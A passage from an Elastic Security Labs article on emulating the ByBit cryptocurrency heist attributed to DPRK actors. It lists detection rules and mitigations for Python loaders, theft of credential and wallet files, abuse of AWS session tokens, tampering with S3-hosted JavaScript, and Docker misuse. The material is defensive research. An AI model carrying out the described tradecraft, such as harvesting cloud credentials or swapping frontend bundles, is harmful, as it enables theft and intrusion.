<p><strong>Rule Name: “<a href="https://github.com/elastic/detection-rules/blob/bbfc026c95fbd9491cdbd06e779e1598ad63a31f/hunting/macos/docs/defense_evasion_self_deleting_python_script.md">Self-Deleting Python Script</a>”:</strong> Detects when a Python script executes and that script file is immediately deleted by the same Python process.</p>
<p><strong>Rule Name: “<a href="https://github.com/elastic/detection-rules/blob/84966f02a1b71cce13db22b6c348cb46560529b7/hunting/macos/docs/defense_evasion_self_deleted_python_script_outbound_network_connection.md">Self-Deleted Python Script Outbound Connection</a>”:</strong> Detects when a Python script gets deleted and an outbound network connection occurs shortly after by the same Python process.</p>
<h5 class="eyebrow relative"><span id="python-loader-script-ret--1" class="absolute -top-32"></span>Python Loader Script Ret == 1</h5>
<p><strong>Rule Name: “<a href="https://github.com/elastic/detection-rules/blob/84966f02a1b71cce13db22b6c348cb46560529b7/hunting/macos/docs/command_and_control_suspicious_executable_file_creation_via_python.md">Suspicious Executable File Creation via Python</a>”:</strong> Detects when an executable file gets created or modified by Python in suspicious or unusual directories.</p>
<p><strong>Rule Name: “<a href="https://github.com/elastic/detection-rules/blob/bbfc026c95fbd9491cdbd06e779e1598ad63a31f/hunting/macos/docs/defense_evasion_python_library_load_and_delete.md">Python Library Load and Delete</a>”:</strong> Detects when a shared library, located within the users home directory, gets loaded by Python followed by the deletion of the library shortly after by the same Python process.</p>
<p><strong>Rule Name: “<a href="https://github.com/elastic/detection-rules/blob/bbfc026c95fbd9491cdbd06e779e1598ad63a31f/hunting/macos/docs/execution_unusual_library_load_via_python.md">Unusual Library Load via Python</a>”:</strong> Detects when a shared library gets loaded by Python that does not denote itself as a .dylib or .so file and is located within the users home directory.</p>
<p><strong>Rule Name: “<a href="https://github.com/elastic/endpoint-rules/blob/13bad7e92e53f078b97bbeb376aedb23797be21b/rules/macos/defense_evasion_potential_in_memory_jxa_load_via_untrusted_or_unsigned_binary.toml">In-Memory JXA Execution via ScriptingAdditions</a>”:</strong> Detects the in-memory load and execution of a JXA script.</p>
<h5 class="eyebrow relative"><span id="python-loader-script-ret--2" class="absolute -top-32"></span>Python Loader Script Ret == 2</h5>
<p><strong>Rule Name: “<a href="https://github.com/elastic/detection-rules/blob/bbfc026c95fbd9491cdbd06e779e1598ad63a31f/hunting/macos/docs/credential_access_potential_python_stealer.md">Potential Python Stealer</a>”:</strong> Detects when a Python script gets executed followed shortly after by at least three attempts to access sensitive files by the same Python process.</p>
<p><strong>Rule Name: “<a href="https://github.com/elastic/detection-rules/blob/bbfc026c95fbd9491cdbd06e779e1598ad63a31f/hunting/macos/docs/defense_evasion_self_deleted_python_script_accessing_sensitive_files.md">Self-Deleted Python Script Accessing Sensitive Files</a>”:</strong> Detects when a Python script gets deleted and sensitive files are accessed shortly after by the same Python process.</p>
<h5 class="eyebrow relative"><span id="python-loader-script-ret--3" class="absolute -top-32"></span>Python Loader Script Ret == 3</h5>
<p><strong>Rule Name: “<a href="https://github.com/elastic/detection-rules/blob/bbfc026c95fbd9491cdbd06e779e1598ad63a31f/hunting/macos/docs/execution_unsigned_or_untrusted_binary_execution_via_python.md">Unsigned or Untrusted Binary Execution via Python</a>”:</strong> Detects when an unsigned or untrusted binary gets executed by Python where the executable is located within a suspicious directory.</p>
<p><strong>Rule Name: “<a href="https://github.com/elastic/detection-rules/blob/bbfc026c95fbd9491cdbd06e779e1598ad63a31f/hunting/macos/docs/execution_unsigned_or_untrusted_binary_fork_via_python.md">Unsigned or Untrusted Binary Fork via Python</a>”:</strong> Detects when an unsigned or untrusted binary gets fork exec’d by Python where the process argument is the path to a file within the users home directory.</p>
<p><strong>Rule Name: “<a href="https://github.com/elastic/endpoint-rules/blob/13bad7e92e53f078b97bbeb376aedb23797be21b/rules/macos/credential_access_cloud_credential_file_accessed_by_untrusted_or_unsigned_process.toml">Cloud Credential Files Accessed by Process in Suspicious Directory</a>”:</strong> Detects when cloud credentials are accessed by a process running from a suspicious directory.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="siem-detections-for-aws-cloudtrail-logs" class="absolute -top-32"></span>SIEM Detections for AWS CloudTrail Logs</h4>
<p><strong>Rule Name: “<a href="https://github.com/elastic/detection-rules/blob/44a2f4c41aa1482ec545f0391040e254c29a8d80/rules/integrations/aws/initial_access_iam_session_token_used_from_multiple_addresses.toml">STS Temporary IAM Session Token Used from Multiple Addresses</a>”:</strong> Detects AWS IAM session tokens (e.g. ASIA*) being used from multiple source IP addresses in a short timeframe, which may indicate credential theft and reuse from adversary infrastructure.</p>
<p><strong>Rule Name: “<a href="https://github.com/elastic/detection-rules/blob/2f4a310cc5d75f8d8f2a2d0f5ad5e5a4537e26a3/rules/integrations/aws/persistence_aws_attempt_to_register_virtual_mfa_device.toml">IAM Attempt to Register Virtual MFA Device with Temporary Credentials</a>”:</strong> Detects attempts to call CreateVirtualMFADevice or EnableMFADevice with AWS session tokens. This may reflect an attempt to establish persistent access using hijacked short-term credentials.</p>
<p><strong>Rule Name: “<a href="https://github.com/elastic/detection-rules/blob/b64ecc925304b492d7855d357baa6c68711eef9a/rules/integrations/aws/persistence_iam_sts_api_calls_via_user_session_token.toml">API Calls to IAM via Temporary Session Tokens</a>”:</strong> Detects use of sensitive iam.amazonaws.com API operations by a principal using temporary credentials (e.g. session tokens with ASIA* prefix). These operations typically require MFA or should only be performed via the AWS console or federated users. Not CLI or automation tokens.</p>
<p><strong>Rule Name: “<a href="https://github.com/elastic/detection-rules/blob/29dfe1217d1320ab400d051de377664fdbb09493/rules/integrations/aws/impact_s3_static_site_js_file_uploaded.toml">S3 Static Site JavaScript File Uploaded via PutObject</a>”:</strong> Identifies attempts by IAM users to upload or modify JavaScript files in the static/js/ directory of an S3 bucket, which can signal frontend tampering (e.g. injection of malicious code)</p>
<p><strong>Rule Name: “<a href="https://github.com/elastic/detection-rules/blob/b35f7366e92321105f61249b233f436c40b59c19/rules/integrations/aws/initial_access_kali_user_agent_detected_with_aws_cli.toml">AWS CLI with Kali Linux Fingerprint Identified</a>”:</strong> Detects AWS API calls made from a system using Kali Linux, as indicated by the user_agent.original string. This may reflect attacker infrastructure or unauthorized access from red team tooling.</p>
<p><strong>Rule Name: “<a href="https://github.com/elastic/detection-rules/blob/main/hunting/aws/queries/s3_public_bucket_rapid_object_access_attempts.toml">S3 Excessive or Suspicious GetObject Events</a>”:</strong> Detects a high volume of S3 GetObject actions by the same IAM user or session within a short time window. This may indicate S3 data exfiltration using tools like AWS CLI command <em>sync</em> - particularly targeting static site files or frontend bundles. Note, this is a hunting query and should be adjusted accordingly.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="siem-detections-for-docker-abuse" class="absolute -top-32"></span>SIEM Detections for Docker Abuse</h4>
<p><strong>Rule Name: “<a href="https://github.com/elastic/detection-rules/blob/bbfc026c95fbd9491cdbd06e779e1598ad63a31f/hunting/macos/docs/execution_suspicious_file_access_via_docker.md">Sensitive File Access via Docker</a>”:</strong> Detects when Docker accesses sensitive host files (“ssh”, “aws”, “gcloud”, “azure”, “web browser”, “crypto wallet files”).</p>
<p><strong>Rule Name: “<a href="https://github.com/elastic/detection-rules/blob/bbfc026c95fbd9491cdbd06e779e1598ad63a31f/hunting/macos/docs/execution_suspicious_executable_file_modification_via_docker.md">Suspicious Executable File Modification via Docker</a>”:</strong> Detects when Docker creates or modifies an executable file within a suspicious or unusual directory.</p>
<p>If your macOS agent policy includes the <a href="https://www.elastic.co/docs/reference/beats/filebeat/filebeat-input-container">Docker data integration</a>, you can collect valuable telemetry that helps surface malicious container activity on user systems. In our emulation, this integration allowed us to ingest Docker logs (into the metrics index), which we then used to build a detection rule capable of identifying indicators of compromise and suspicious container executions associated with the malicious application.</p>
<p></p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="mitigations" class="absolute -top-32"></span>Mitigations</h2>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="social-engineering" class="absolute -top-32"></span>Social Engineering</h3>
<p>Social engineering plays a major role in many intrusions, but especially with the DPRK. They are highly adept at targeting and approaching their victims utilizing trusted public platforms like LinkedIn, Telegram, X or Discord to initiate contact and appear legitimate. Many of their social engineering campaigns attempt to convince the user to download and execute some kind of project, application or script whether it be out of necessity (job application), distress (debugging assistance) etc.. Mitigation of targeting that leverage social engineering is difficult and takes a concerted effort by a company to ensure their employees are regularly trained to recognize these attempts, applying the proper skepticism and caution when engaging outside entities and even the open source communities.</p>
<ul>
<li>User Awareness Training</li>
<li>Manual Static Code Review</li>
<li>Static Code and Dependency Scanning</li>
</ul>
<p>Bandit (<a href="https://github.com/PyCQA/bandit">GitHub - PyCQA/bandit: Bandit is a tool designed to find common security issues in Python code.</a>) is a great example of an open source tool a developer could use to scan the Python application and its scripts prior to execution in order to surface common Python security vulnerabilities or dangerous issues that may be present in the code.</p>
<p></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="application-and-device-management" class="absolute -top-32"></span>Application and Device Management</h3>
<p>Application controls via a device management solution or a binary authorization framework like the open source tool Santa (<a href="https://github.com/northpolesec/santa">GitHub - northpolesec/santa: A binary and file access authorization system for macOS.</a>) could have been used to enforce notarization and block execution from suspicious paths. This would have prevented the execution of the Poseidon payload dropped to the system for persistence, and could have prevented access to sensitive files.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="edrxdr" class="absolute -top-32"></span>EDR/XDR</h3>
<p>To effectively defend against nation-state threats—and the many other attacks targeting macOS—it&#x27;s critical to have an EDR solution in place that provides rich telemetry and correlation capabilities to detect and prevent script-based attacks. Taking it a step further, an EDR platform like Elastic allows you to ingest AWS logs alongside endpoint data, enabling unified alerting and visibility through a single pane of glass. When combined with AI-powered correlation, this approach can surface cohesive attack narratives, significantly accelerating response and improving your ability to act quickly if such an attack occurs.</p>
<p></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="aws-credential-exposure-and-session-token-hardening" class="absolute -top-32"></span>AWS Credential Exposure and Session Token Hardening</h3>
<p>In this attack, the adversary leveraged a stolen AWS user session token (with the ASIA* prefix), which had been issued via the GetSessionToken API using MFA. These credentials were likely retrieved from the macOS developer environment — either from exported environment variables or default AWS config paths (e.g., <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.aws/credentials</code>).</p>
<p>To mitigate this type of access, organizations can implement the following defensive strategies:</p>
<ol>
<li><strong>Reduce Session Token Lifetimes and Move Away from IAM Users</strong>: Avoid issuing long-lived session tokens to IAM users. Instead, enforce short token durations (e.g., 1 hour or less) and adopt AWS SSO (IAM Identity Center) for all human users. This makes session tokens ephemeral, auditable, and tied to identity federation. Disabling sts:GetSessionToken permissions for IAM users altogether is the strongest approach, and IAM Identity Center allows this transition.</li>
<li><strong>Enforce Session Context Restrictions for IAM API Usage</strong>: Implement IAM policy condition blocks that explicitly deny sensitive IAM operations, such as <em>iam:CreateVirtualMFADevice</em> or <em>iam:AttachUserPolicy</em>, if the request is made using temporary credentials. This ensures that session-based keys, such as those used in the attack, cannot escalate privileges or modify identity constructs.</li>
<li><strong>Limit MFA Registration to Trusted Paths</strong>: Block MFA device creation (<em>CreateVirtualMFADevice</em>, <em>EnableMFADevice</em>) via session tokens unless coming from trusted networks, devices, or IAM roles. Use <em>aws:SessionToken</em> or <em>aws:ViaAWSService</em> as policy context keys to enforce this. This would have prevented the adversary from attempting MFA-based persistence using the hijacked session.</li>
</ol>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="s3-application-layer-hardening-frontend-tampering" class="absolute -top-32"></span>S3 Application Layer Hardening (Frontend Tampering)</h3>
<p>After obtaining the AWS session token, the adversary did not perform any IAM enumeration — instead, they pivoted quickly to S3 operations. Using the AWS CLI and temporary credentials, they listed S3 buckets and modified static frontend JavaScript hosted on a public S3 bucket. This allowed them to replace the production Next.js bundle with a malicious variant designed to redirect transactions based on specific wallet addresses.</p>
<p>To prevent this type of frontend tampering, implement the following hardening strategies:</p>
<ol>
<li><strong>Enforce Immutability with S3 Object Lock</strong>: Enable S3 Object Lock in compliance or governance mode on buckets hosting static frontend content. This prevents overwriting or deletion of files for a defined retention period - even by compromised users. Object Lock adds a strong immutability guarantee and is ideal for public-facing application layers. Access to put new objects (rather than overwrite) can still be permitted via deployment roles.</li>
<li><strong>Implement Content Integrity with Subresource Integrity (SRI)</strong>: Include SRI hashes (e.g., SHA-256) in the &lt;script&gt; tags within index.html to ensure the frontend only executes known, validated JavaScript bundles. In this attack, the lack of integrity checks allowed arbitrary JavaScript to be served and executed from the S3 bucket. SRI would have blocked this behavior at the browser level.</li>
<li><strong>Restrict Upload Access Using CI/CD Deployment Boundaries</strong>: Developers should never have direct write access to production S3 buckets. Use separate AWS accounts or IAM roles for development and CI/CD deployment. Only OIDC-authenticated GitHub Actions or trusted CI pipelines should be permitted to upload frontend bundles to production buckets. This ensures human credentials, even if compromised, cannot poison production.</li>
<li><strong>Lock Access via CloudFront Signed URLs or Use S3 Versioning</strong>: If the frontend is distributed via CloudFront, restrict access to S3 using signed URLs and remove public access to the S3 origin. This adds a proxy and control layer. Alternatively, enable S3 versioning and monitor for overwrite events on critical assets (e.g., /static/js/*.js). This can help detect tampering by adversaries attempting to replace frontend files.</li>
</ol>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="attack-discovery-ad" class="absolute -top-32"></span>Attack Discovery (AD)</h2>
<p>After completing the end-to-end attack emulation, we tested Elastic’s new AI Attack Discovery feature to see if it could connect the dots between the various stages of the intrusion. Attack Discovery integrates with an LLM of your choice to analyze alerts across your stack and generate cohesive attack narratives. These narratives help analysts quickly understand what happened, reduce response time, and gain high-level context. In our test, it successfully correlated the endpoint compromise with the AWS intrusion, providing a unified story that an analyst could use to take informed action.</p>
<p></p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="osquery" class="absolute -top-32"></span>OSQuery</h2>
<p>When running Elastic Defend through Elastic Agent, you can also deploy the OSQuery Manager integration to centrally manage Osquery across all agents in your Fleet. This enables you to query host data using distributed SQL. During our testing of the Dockerized malicious application, we used OSQuery to inspect the endpoint and successfully identified the container running with privileged permissions.</p>
<pre><code>SELECT name, image, readonly_rootfs, privileged FROM docker_containers</code></pre>
<p></p>
<p>We scheduled this query to run on a recurring basis, sending results back to our Elastic Stack. From there, we built a threshold-based detection rule that alerts whenever a new privileged container appears on a user’s system and hasn’t been observed in the past seven days.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="conclusion" class="absolute -top-32"></span>Conclusion</h2>
<p>The ByBit attack was one of the most consequential intrusions attributed to DPRK threat actors—and thanks to detailed reporting and available artifacts, it also provided a rare opportunity for defenders to emulate the full attack chain end to end. By recreating the compromise of a SAFE developer’s macOS workstation—including initial access, payload execution, and AWS pivoting—we validated our detection capabilities against real-world nation-state tradecraft.</p>
<p>This emulation not only highlighted technical insights—like how PyYAML deserialization can be abused to gain initial access—but also reinforced critical lessons in operational defense: the value of user awareness, behavior-based EDR coverage, secure developer workflows, effective cloud IAM policies, cloud logging and holistic detection/response across platforms.</p>
<p>Adversaries are innovating constantly, but so are defenders—and this kind of research helps tip the balance. We encourage you to follow <a href="https://x.com/elasticseclabs">@elasticseclabs</a> and check out our threat research at <a href="https://www.elastic.co/security-labs">elastic.co/security-labs</a> to stay ahead of evolving adversary techniques.</p>
<p>Resources:</p>
<ol>
<li><a href="https://www.sygnia.co/blog/sygnia-investigation-bybit-hack/">Bybit – What We Know So Far</a></li>
<li><a href="https://x.com/safe/status/1897663514975649938">Safe.eth on X: &quot;Investigation Updates and Community Call to Action&quot;</a></li>
<li><a href="https://slowmist.medium.com/cryptocurrency-apt-intelligence-unveiling-lazarus-groups-intrusion-techniques-a1a6efda7d34">Cryptocurrency APT Intelligence: Unveiling Lazarus Group’s Intrusion Techniques</a></li>
<li><a href="https://unit42.paloaltonetworks.com/slow-pisces-new-custom-malware/">Slow Pisces Targets Developers With Coding Challenges and Introduces New Customized Python Malware</a></li>
<li><a href="https://www.elastic.co/security-labs/dprk-code-of-conduct">Code of Conduct: DPRK’s Python-fueled intrusions into secured networks</a></li>
<li><a href="https://www.elastic.co/security-labs/elastic-catches-dprk-passing-out-kandykorn">Elastic catches DPRK passing out KANDYKORN</a></li>
</ol></div></div></div><div class="hidden lg:flex lg:col-span-1 text-sm lg:flex-col lg:space-y-6"><div class="toc"><h4 class="font-bold leading-tight text-lg md:text-2xl mb-3">Jump to section</h4><ul class="flex flex-col space-y-2"><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/bit-bybit#key-takeaways"><span>Key&nbsp;takeaways</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/bit-bybit#introduction"><span>Introduction</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/bit-bybit#chronology-of-events"><span>Chronology of&nbsp;events</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/bit-bybit#assumptions-for-emulation-"><span>Assumptions for emulation&nbsp;</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/bit-bybit#overview-of-the-attack"><span>Overview of the&nbsp;attack</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/bit-bybit#emulating-the-attack"><span>Emulating the&nbsp;attack</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/bit-bybit#macos-endpoint-compromise"><span>MacOS endpoint&nbsp;compromise</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-8" href="/security-labs/bit-bybit#malicious-python-application-"><span>Malicious Python Application&nbsp;</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-8" href="/security-labs/bit-bybit#pyyaml-deserialization-payload-"><span>PyYAML Deserialization Payload&nbsp;</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-8" href="/security-labs/bit-bybit#python-loader-script-"><span>Python Loader Script&nbsp;</span></a></li></ul><button class="border-t border-white/20 w-full mt-3 py-2 flex items-center space-x-1 text-xs font-medium uppercase tracking-wide hover:text-white"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="w-3 h-3"><path d="M10.75 4.75a.75.75 0 00-1.5 0v4.5h-4.5a.75.75 0 000 1.5h4.5v4.5a.75.75 0 001.5 0v-4.5h4.5a.75.75 0 000-1.5h-4.5v-4.5z"></path></svg><span>Show more</span></button></div><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 md:p-2 sm:p-4 md:px-6 md:py-4 rounded-xl"><h4 class="font-bold leading-tight text-lg md:text-2xl mb-3">Elastic Security Labs Newsletter</h4><div><a target="_blank" class="button inline-flex" href="https://www.elastic.co/elastic-security-labs/newsletter?utm_source=security-labs">Sign Up</a></div></div></div></div><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 md:p-2 sm:p-4 md:px-6 md:py-4 rounded-xl my-5 md:my-10 max-w-3xl mx-auto flex flex-col items-center shadow-2xl"><h4 class="font-bold leading-tight text-lg md:text-2xl">Share this article</h4><div class="flex flex-wrap items-center justify-center mt-4 space-x-4"><a class="flex items-center space-x-2 button" href="https://twitter.com/intent/tweet?text=Bit ByBit - emulation of the DPRK&#x27;s largest cryptocurrency heist&amp;url=https://www.elastic.co/security-labs/bit-bybit" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Twitter" title="Share this article on Twitter"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M23.954 4.569c-.885.389-1.83.653-2.825.772a4.98 4.98 0 002.187-2.746 9.955 9.955 0 01-3.157 1.204 4.98 4.98 0 00-8.49 4.54A14.128 14.128 0 011.69 3.05a4.98 4.98 0 001.54 6.638A4.94 4.94 0 011.2 8.62v.06a4.98 4.98 0 004 4.87 4.94 4.94 0 01-2.24.086 4.98 4.98 0 004.64 3.45A9.97 9.97 0 010 20.35a14.075 14.075 0 007.59 2.22c9.16 0 14.17-7.583 14.17-14.17 0-.217-.005-.434-.015-.65a10.128 10.128 0 002.485-2.58l-.001-.001z"></path></svg><span>Twitter</span></a><a class="flex items-center space-x-2 button" href="https://www.facebook.com/sharer/sharer.php?u=https://www.elastic.co/security-labs/bit-bybit" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Facebook" title="Share this article on Facebook"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M22.5 12c0-5.799-4.701-10.5-10.5-10.5S1.5 6.201 1.5 12c0 5.301 3.901 9.699 9 10.401V14.4h-2.7v-2.7h2.7v-2.1c0-2.7 1.8-4.2 4.2-4.2 1.2 0 2.1.1 2.4.2v2.4h-1.5c-1.2 0-1.5.6-1.5 1.5v1.8h3l-.3 2.7h-2.7V22C18.599 21.3 22.5 17.301 22.5 12z"></path></svg><span>Facebook</span></a><a class="flex items-center space-x-2 button" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://www.elastic.co/security-labs/bit-bybit&amp;title=Bit ByBit - emulation of the DPRK&#x27;s largest cryptocurrency heist" target="_blank" rel="noopener noreferrer" aria-label="Share this article on LinkedIn" title="Share this article on LinkedIn"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"></path></svg><span>LinkedIn</span></a><a class="flex items-center space-x-2 button" href="https://reddit.com/submit?url=https://www.elastic.co/security-labs/bit-bybit&amp;title=Bit ByBit - emulation of the DPRK&#x27;s largest cryptocurrency heist" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Reddit" title="Share this article on Reddit"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill-rule="evenodd" clip-rule="evenodd" d="M24 12C24 18.6274 18.6274 24 12 24C5.37258 24 0 18.6274 0 12C0 5.37258 5.37258 0 12 0C18.6274 0 24 5.37258 24 12ZM19.6879 11.0584C19.8819 11.3352 19.9916 11.6622 20.004 12C20.0091 12.3306 19.9205 12.656 19.7485 12.9384C19.5765 13.2208 19.3281 13.4488 19.032 13.596C19.0455 13.7717 19.0455 13.9483 19.032 14.124C19.032 16.812 15.9 18.996 12.036 18.996C8.172 18.996 5.04 16.812 5.04 14.124C5.02649 13.9483 5.02649 13.7717 5.04 13.596C4.80919 13.49 4.6042 13.335 4.43923 13.1419C4.27427 12.9487 4.15327 12.722 4.08462 12.4775C4.01598 12.2329 4.00133 11.9764 4.04169 11.7256C4.08205 11.4748 4.17646 11.2358 4.31837 11.0251C4.46028 10.8145 4.6463 10.6372 4.86354 10.5056C5.08078 10.3739 5.32404 10.2911 5.57646 10.2629C5.82889 10.2346 6.08444 10.2616 6.32541 10.3419C6.56638 10.4222 6.78701 10.5539 6.972 10.728C8.35473 9.79023 9.98146 9.27718 11.652 9.252L12.54 5.088C12.55 5.03979 12.5694 4.99405 12.5972 4.95341C12.625 4.91277 12.6605 4.87805 12.7018 4.85127C12.7431 4.82448 12.7894 4.80615 12.8378 4.79735C12.8862 4.78855 12.9359 4.78945 12.984 4.8L15.924 5.388C16.0676 5.14132 16.2944 4.9539 16.5637 4.85937C16.833 4.76484 17.1272 4.7694 17.3934 4.87222C17.6597 4.97505 17.8806 5.1694 18.0164 5.42041C18.1523 5.67141 18.1942 5.96262 18.1348 6.24177C18.0753 6.52092 17.9182 6.76972 17.6918 6.94352C17.4654 7.11732 17.1845 7.20473 16.8995 7.19006C16.6144 7.1754 16.3439 7.05962 16.1366 6.8635C15.9292 6.66738 15.7985 6.40378 15.768 6.12L13.2 5.58L12.42 9.324C14.0702 9.3594 15.6749 9.87206 17.04 10.8C17.2839 10.566 17.5902 10.4074 17.9221 10.3436C18.254 10.2797 18.5973 10.3132 18.9106 10.4401C19.2239 10.5669 19.4939 10.7817 19.6879 11.0584ZM8.20624 12.5333C8.07438 12.7307 8.004 12.9627 8.004 13.2C8.004 13.5183 8.13043 13.8235 8.35547 14.0485C8.58051 14.2736 8.88574 14.4 9.204 14.4C9.44134 14.4 9.67335 14.3296 9.87068 14.1978C10.068 14.0659 10.2218 13.8785 10.3127 13.6592C10.4035 13.4399 10.4272 13.1987 10.3809 12.9659C10.3346 12.7331 10.2204 12.5193 10.0525 12.3515C9.8847 12.1836 9.67089 12.0694 9.43811 12.0231C9.20533 11.9768 8.96405 12.0005 8.74478 12.0913C8.52551 12.1822 8.33809 12.336 8.20624 12.5333ZM12.012 17.424C13.0771 17.4681 14.1246 17.1416 14.976 16.5V16.548C15.0075 16.5173 15.0327 16.4806 15.05 16.4402C15.0674 16.3997 15.0766 16.3563 15.0772 16.3122C15.0777 16.2682 15.0696 16.2245 15.0533 16.1837C15.0369 16.1428 15.0127 16.1055 14.982 16.074C14.9513 16.0425 14.9146 16.0173 14.8742 16C14.8337 15.9826 14.7903 15.9734 14.7462 15.9728C14.7022 15.9723 14.6585 15.9804 14.6177 15.9967C14.5768 16.0131 14.5395 16.0373 14.508 16.068C13.7797 16.5904 12.895 16.8487 12 16.8C11.1061 16.8399 10.2255 16.5732 9.504 16.044C9.44182 15.993 9.36289 15.9669 9.28256 15.9708C9.20222 15.9748 9.12622 16.0085 9.06935 16.0653C9.01247 16.1222 8.97879 16.1982 8.97484 16.2786C8.97089 16.3589 8.99697 16.4378 9.048 16.5C9.89937 17.1416 10.9469 17.4681 12.012 17.424ZM14.0933 14.2458C14.2907 14.3776 14.5227 14.448 14.76 14.448L14.748 14.496C14.9107 14.4978 15.0721 14.4664 15.2223 14.4038C15.3725 14.3413 15.5084 14.2488 15.6218 14.1321C15.7352 14.0154 15.8236 13.8768 15.8818 13.7248C15.9399 13.5728 15.9665 13.4106 15.96 13.248C15.96 13.0107 15.8896 12.7787 15.7578 12.5813C15.6259 12.384 15.4385 12.2302 15.2192 12.1393C14.9999 12.0485 14.7587 12.0248 14.5259 12.0711C14.2931 12.1174 14.0793 12.2316 13.9115 12.3995C13.7436 12.5673 13.6294 12.7811 13.5831 13.0139C13.5368 13.2467 13.5605 13.4879 13.6513 13.7072C13.7422 13.9265 13.896 14.1139 14.0933 14.2458Z" fill="currentColor"></path></svg><span>Reddit</span></a></div></div></article></main><footer class="mt-auto text-xs md:text-sm"><div class="container py-6 flex flex-col md:flex-row gap-2 md:gap-0 justify-between items-center"><div class="text-zinc-300"><nav><ul class="flex space-x-4"><li><a class="hover:text-white font-medium" href="/security-labs/sitemap.xml">Sitemap</a></li><li><a class="hover:text-white font-medium flex items-center space-x-1" href="https://elastic.co?utm_source=elastic-search-labs&amp;utm_medium=referral&amp;utm_campaign=search-labs&amp;utm_content=footer"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="inline-block w-3 h-3"><path stroke-linecap="round" stroke-linejoin="round" d="M13.5 6H5.25A2.25 2.25 0 003 8.25v10.5A2.25 2.25 0 005.25 21h10.5A2.25 2.25 0 0018 18.75V10.5m-10.5 6L21 3m0 0h-5.25M21 3v5.25"></path></svg><span>Elastic.co</span></a></li><li><a class="hover:text-white font-medium flex items-center space-x-1" href="https://twitter.com/elasticseclabs"><svg class="w-4 h-4 inline-block w-3 h-3" viewBox="0 0 24 24"><path fill="currentColor" d="M23.954 4.569c-.885.389-1.83.653-2.825.772a4.98 4.98 0 002.187-2.746 9.955 9.955 0 01-3.157 1.204 4.98 4.98 0 00-8.49 4.54A14.128 14.128 0 011.69 3.05a4.98 4.98 0 001.54 6.638A4.94 4.94 0 011.2 8.62v.06a4.98 4.98 0 004 4.87 4.94 4.94 0 01-2.24.086 4.98 4.98 0 004.64 3.45A9.97 9.97 0 010 20.35a14.075 14.075 0 007.59 2.22c9.16 0 14.17-7.583 14.17-14.17 0-.217-.005-.434-.015-.65a10.128 10.128 0 002.485-2.58l-.001-.001z"></path></svg><span>@elasticseclabs</span></a></li></ul></nav></div><div class="flex flex-col space-y-1 text-zinc-300"><p>© <!-- -->2025<!-- -->. Elasticsearch B.V. All Rights Reserved.</p></div></div></footer></main></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"article":{"title":"Bit ByBit - emulation of the DPRK's largest cryptocurrency heist","slug":"bit-bybit","date":"2025-05-06","description":"A high-fidelity emulation of the DPRK's largest cryptocurrency heist via a compromised macOS developer and AWS pivots.","image":"bit-bybit.jpg","body":{"raw":"\n## Key takeaways\n\nKey takeaways from this research:\n\n- PyYAML was deserialization as initial access vector\n- The attack leveraged session token abuse and AWS lateral movement\n- Static site supply chain tampering\n- Docker-based stealth on macOS\n- End-to-end detection correlation with Elastic\n\n## Introduction\n\nOn February 21, 2025, the crypto world was shaken when approximately 400,000 ETH vanished from ByBit —one of the industry’s largest cryptocurrency exchanges. Behind this incredible theft is believed to be North Korea’s elite cyber-offensive unit, referred to as [TraderTraitor](https://www.ic3.gov/PSA/2025/PSA250226). Exploiting a trusted vendor relationship with Safe\\{Wallet\\}, a multisig (multi-signature) wallet platform, TraderTraitor transformed a routine transaction into a billion-dollar heist. Supply chain targeting has become a hallmark of the DPRK’s cyber strategy, underpinning the regime’s theft of more than [$6 billion](https://www.chainalysis.com/blog/crypto-hacking-stolen-funds-2025/) in cryptocurrency since 2017. In this article we’ll dissect this attack, carefully emulate its tactics within a controlled environment, and provide practical lessons to reinforce cybersecurity defenses using Elastic’s product and features. \n\nOur emulation of this threat is based on research released by 